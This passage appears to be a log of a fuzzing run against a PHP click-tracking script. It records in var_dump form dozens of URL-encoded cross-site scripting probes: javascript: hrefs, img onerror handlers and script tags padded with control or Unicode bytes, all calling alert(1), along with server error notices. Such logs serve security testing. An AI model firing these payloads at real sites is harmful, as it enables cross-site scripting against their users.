+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(94) "%3Ca%20href=%22%5CxC2%5CxA0javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx05javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE1%5CxA0%5Cx8Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx18javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx11javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx88javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx89javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx17javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx03javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx0Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx1Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx00javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx10javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx82javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx20javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx13javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx09javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx8Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx14javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx19javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5CxAFjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx1Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx81javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx1Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx87javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx07javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE1%5Cx9A%5Cx80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx83javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx04javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx01javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx08javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx84javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx86javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE3%5Cx80%5Cx80javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx12javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx0Djavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx0Ajavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx0Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx15javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5CxA8javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx16javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx02javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx1Bjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx06javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5CxA9javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx80%5Cx85javascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx1Ejavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(100) "%3Ca%20href=%22%5CxE2%5Cx81%5Cx9Fjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22%5Cx1Cjavascript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22javascript%5Cx00:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22javascript%5Cx3A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22javascript%5Cx09:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22javascript%5Cx0D:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(88) "%3Ca%20href=%22javascript%5Cx0A:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C"
+  [2]=>
+  string(4) "a%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx0Aonerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx22onerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx0Bonerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx0Donerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx2Fonerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx09onerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx0Conerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx00onerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx27onerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(67) "%60%22'%3E%3Cimg%20src=xxx:x%20%5Cx20onerror=javascript:alert(1)%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx3Bjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx0Djavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxEF%5CxBB%5CxBFjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx81javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx84javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE3%5Cx80%5Cx80javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx09javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx89javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx85javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx88javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx00javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5CxA8javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Ajavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE1%5Cx9A%5Cx80javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx0Cjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx2Bjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(68) "%22%60'%3E%3Cscript%3E%5CxF0%5Cx90%5Cx96%5Cx9Ajavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(45) "%22%60'%3E%3Cscript%3E-javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx0Ajavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5CxAFjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx7Ejavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx87javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx81%5Cx9Fjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5CxA9javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%22%60'%3E%3Cscript%3E%5CxC2%5Cx85javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxEF%5CxBF%5CxAEjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx83javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Bjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxEF%5CxBF%5CxBEjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx80javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx21javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx82javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE2%5Cx80%5Cx86javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(62) "%22%60'%3E%3Cscript%3E%5CxE1%5CxA0%5Cx8Ejavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx0Bjavascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(50) "%22%60'%3E%3Cscript%3E%5Cx20javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%22%60'%3E%3Cscript%3E%5CxC2%5CxA0javascript:alert(1)%3C"
+  [2]=>
+  string(9) "script%3E"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(48) "%3Cimg%20%5Cx00src=x%20onerror=%22alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20%5Cx47src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20%5Cx11src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20%5Cx12src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%5Cx47src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%5Cx10src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%5Cx13src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%5Cx32src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%5Cx47src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(56) "%3Cimg%5Cx11src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20%5Cx47src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20%5Cx34src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(59) "%3Cimg%20%5Cx39src=x%20onerror=%22javascript:alert(1)%22%3E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
